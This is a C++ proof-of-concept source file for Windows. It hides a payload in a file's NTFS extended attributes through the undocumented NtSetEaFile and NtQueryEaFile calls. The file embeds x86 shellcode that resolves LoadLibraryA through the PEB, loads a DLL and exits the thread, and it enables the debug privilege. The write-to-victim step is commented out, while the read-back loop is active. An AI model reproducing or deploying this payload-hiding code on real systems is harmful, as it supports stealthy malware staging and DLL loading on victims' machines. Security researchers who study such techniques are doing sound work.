#include <windows.h>
#include <iostream>
#include <tchar.h>

#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
#define NT_ERROR(Status)   ((((ULONG)(Status)) >> 30) == 3)

typedef struct _IO_STATUS_BLOCK
{
	union
	{
		NTSTATUS Status;
		PVOID Pointer;
	};
	ULONG_PTR Information;
} IO_STATUS_BLOCK, * PIO_STATUS_BLOCK;

/*
 * http://undocumented.ntinternals.net/UserMode/Undocumented%20Functions/NT%20Objects/File/NtSetEaFile.html
*/
typedef NTSTATUS(WINAPI* pNtSetEaFile)(
	_In_ HANDLE FileHandle,
	_Out_ PIO_STATUS_BLOCK IoStatusBlock,
	_In_ PVOID Buffer,
	_In_ ULONG Length
	);

/*
 * http://undocumented.ntinternals.net/UserMode/Undocumented%20Functions/NT%20Objects/File/NtQueryEaFile.html
*/
typedef NTSTATUS(WINAPI* pNtQueryEaFile)(
	_In_ HANDLE FileHandle,
	_Out_ PIO_STATUS_BLOCK IoStatusBlock,
	_Out_ PVOID Buffer,
	_In_ ULONG Length,
	_In_ BOOLEAN ReturnSingleEntry,
	_In_ PVOID EaList,
	_In_ ULONG EaListLength,
	_In_opt_ PULONG EaIndex,
	_In_ BOOLEAN RestartScan
	);

/*
 * http://undocumented.ntinternals.net/UserMode/Undocumented%20Functions/NT%20Objects/File/FILE_FULL_EA_INFORMATION.html
*/
typedef struct _FILE_FULL_EA_INFORMATION {
	ULONG NextEntryOffset;
	BYTE Flags;
	BYTE EaNameLength;
	USHORT EaValueLength;
	CHAR EaName[1];

} FILE_FULL_EA_INFORMATION, * PFILE_FULL_EA_INFORMATION;

/* Helper function */
ULONG CalculateEaEntryLength(
	_In_ UCHAR EaNameLength,
	_In_ USHORT EaValueLength
);

/*
 *
*/
PFILE_FULL_EA_INFORMATION CreateEaEntry(
	_In_ ULONG NextEntryOffset,
	_In_ BYTE Flags,
	_In_ BYTE EaNameLength,
	_In_ USHORT EaValueLength,
	_In_ char* EaName,
	_In_ char* EaValue,
	_Out_ ULONG* EaEntryLength
);

int wmain() {
	HANDLE hVictimFile;
	PVOID eaBuffer;
	IO_STATUS_BLOCK ioStatusBlock;
	NTSTATUS status;
	const TCHAR victimFilePath[] = { 'd','b','.','l','o','g',0 };
	ULONG eaLength = -1;
	HANDLE hToken;
	TOKEN_PRIVILEGES tokenPriv;
	LUID luidDebug;

	char name[] = { '$','h','3','1','1','C','0','D','3',0 };
	char value[] = \
		"\x33\xc9\x64\x8b\x41\x30\x8b\x40\x0c\x8b\x70\x14\xad\x96\xad\x8b\x58\x10\x8b\x53\x3c\x03\xd3"
		"\x8b\x52\x78\x03\xd3\x8b\x72\x20\x03\xf3\x33\xc9\x41\xad\x03\xc3\x81\x38\x47\x65\x74\x50\x75"
		"\xf4\x81\x78\x04\x72\x6f\x63\x41\x75\xeb\x81\x78\x08\x64\x64\x72\x65\x75\xe2\x8b\x72\x24\x03"
		"\xf3\x66\x8b\x0c\x4e\x49\x8b\x72\x1c\x03\xf3\x8b\x14\x8e\x03\xd3\x33\xc9\x53\x52\x51\x68\x61"
		"\x72\x79\x41\x68\x4c\x69\x62\x72\x68\x4c\x6f\x61\x64\x54\x53\xff\xd2\x83\xc4\x0c\x59\x50\x51"
		"\x66\xb9\x6c\x6c\x51\x68\x44\x4c\x2e\x64\x54\xff\xd0\x83\xc4\x10\x33\xc9\x5a\x5d\x66\xb9\x61"
		"\x64\x51\x68\x54\x68\x72\x65\x68\x45\x78\x69\x74\x54\x53\xff\xd2\x83\xc4\x0c\x33\xc9\x51\xff"
		"\xd0\x5e\x5b\x5d\xc3";

	pNtSetEaFile NtSetEaFile = (pNtSetEaFile)GetProcAddress(GetModuleHandle(_T("ntdll.dll")), _T("NtSetEaFile"));
	pNtQueryEaFile NtQueryEaFile = (pNtQueryEaFile)GetProcAddress(GetModuleHandle(_T("ntdll.dll")), _T("NtQueryEaFile"));

	// Open handle to the victim file:
	hVictimFile = CreateFile(
		victimFilePath,
		GENERIC_WRITE | GENERIC_READ,
		0,
		nullptr,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		nullptr
	);
	if (hVictimFile == INVALID_HANDLE_VALUE) {
		printf("[-] Could not acquire handle to the file.\n");
		return -1;
	}

	// Enabling the Debug access privilege
	// https://www.codeproject.com/Articles/10438/Navigating-the-PEB
	// https://medium.com/palantir/windows-privilege-abuse-auditing-detection-and-defense-3078a403d74e
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken) != FALSE)
	{
		if (LookupPrivilegeValue(_T(""), SE_DEBUG_NAME, &luidDebug) != FALSE)
		{
			tokenPriv.PrivilegeCount = 1;
			tokenPriv.Privileges[0].Luid = luidDebug;
			tokenPriv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

			AdjustTokenPrivileges(hToken, FALSE, &tokenPriv, sizeof(tokenPriv), NULL, NULL);
		}
	}

	/*
	// Make an Extended-Attribute content:
	eaBuffer = CreateEaEntry(
		0,
		0,
		strlen(name),
		strlen(value),
		name,
		value,
		&eaLength
	);
	if (eaBuffer == nullptr) {
		printf("[+] Could not create EA entry.");
		CloseHandle(hVictimFile);
		return -1;
	}
	// Write Extended-Attribute to victim:
	ioStatusBlock = { 0 };
	status = NtSetEaFile(hVictimFile, &ioStatusBlock, eaBuffer, eaLength);
	if (!NT_SUCCESS(status)) {
		printf("[-] Could not create EA, Error:0x%x.\n", status);
		CloseHandle(hVictimFile);
		return -1;
	}
	*/

	// Read EA:
	// TODO: Setup the length correctly
	eaLength = 167 * 2;
	eaBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, eaLength);
	ioStatusBlock = { 0 };
	status = NtQueryEaFile(
		hVictimFile,
		&ioStatusBlock,
		eaBuffer,
		eaLength,
		FALSE,
		nullptr,
		0,
		nullptr,
		FALSE
	);
	if (!NT_SUCCESS(status)) {
		printf("[-] Could not query for EA, Error:0x%x.\n", status);
		CloseHandle(hVictimFile);
		return -1;
	}

	// Read the EA:
	PFILE_FULL_EA_INFORMATION currEntry = (PFILE_FULL_EA_INFORMATION)eaBuffer;
	ULONG totalOffset = 0;
	ULONG eaEntryIndex = 0;

	while (true) {
		PVOID tempBuffer = (PVOID)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, currEntry->EaValueLength + 1);
		CopyMemory(tempBuffer, (PVOID)&currEntry->EaName[currEntry->EaNameLength + 1], currEntry->EaValueLength);
		printf("Index: %d | totalOffset: %d | NextEntryOffset: %d | Flags: %d | NameLength: %d | ValueLength: %d, | Name: %s | Value: %s",
			eaEntryIndex,
			totalOffset,
			currEntry->NextEntryOffset,
			currEntry->Flags,
			currEntry->EaNameLength,
			currEntry->EaValueLength,
			&currEntry->EaName[0],
			&currEntry->EaName[currEntry->EaNameLength + 1]
		);

		// TODO: Release buffer..

		// If we reach the end of the EA:
		if (currEntry->NextEntryOffset == 0) {
			break;
		}

		// Move to the next entry:
		totalOffset += currEntry->NextEntryOffset;
		eaEntryIndex += 1;
		currEntry = (PFILE_FULL_EA_INFORMATION)((char*)currEntry + currEntry->NextEntryOffset);
	}

	// Release resources:
	CloseHandle(hVictimFile);
	//HeapFree(GetProcessHeap, HEAP_NO_SERIALIZE, eaBuffer);

	return 0;
}


PFILE_FULL_EA_INFORMATION CreateEaEntry(
	_In_ ULONG NextEntryOffset,
	_In_ BYTE Flags,
	_In_ BYTE EaNameLength,
	_In_ USHORT EaValueLength,
	_In_ char* EaName,
	_In_ char* EaValue,
	_Out_ ULONG* EaEntryLength
) {

	FILE_FULL_EA_INFORMATION* eaEntryBuffer = nullptr;

	ULONG eaEntryLength = CalculateEaEntryLength(EaNameLength, EaValueLength);

	// Allocate memory for the entry:
	eaEntryBuffer = (PFILE_FULL_EA_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, eaEntryLength);
	if (eaEntryBuffer == nullptr) {
		return nullptr;
	}

	eaEntryBuffer->NextEntryOffset = NextEntryOffset;
	eaEntryBuffer->Flags = 0x00;
	eaEntryBuffer->EaNameLength = EaNameLength;
	eaEntryBuffer->EaValueLength = EaValueLength;

	// Copy the name and value:
	CopyMemory(eaEntryBuffer->EaName, EaName, EaNameLength);
	CopyMemory((PVOID)(eaEntryBuffer->EaName + eaEntryBuffer->EaNameLength + 1), EaValue, EaValueLength);

	*EaEntryLength = eaEntryLength;
	return eaEntryBuffer;
}

ULONG CalculateEaEntryLength(
	_In_ UCHAR EaNameLength,
	_In_ USHORT EaValueLength
) {
	ULONG eaEntryLength = sizeof(ULONG) + sizeof(UCHAR) * 2 + sizeof(USHORT) + (EaNameLength + 1) + EaValueLength;
	ULONG alignmentBoundary = sizeof(ULONG);

	// Check if the length is aligned to 4bytes:
	if ((eaEntryLength % alignmentBoundary) != 0) {
		eaEntryLength = eaEntryLength + (alignmentBoundary - (eaEntryLength % alignmentBoundary));
	}
	return eaEntryLength;
}


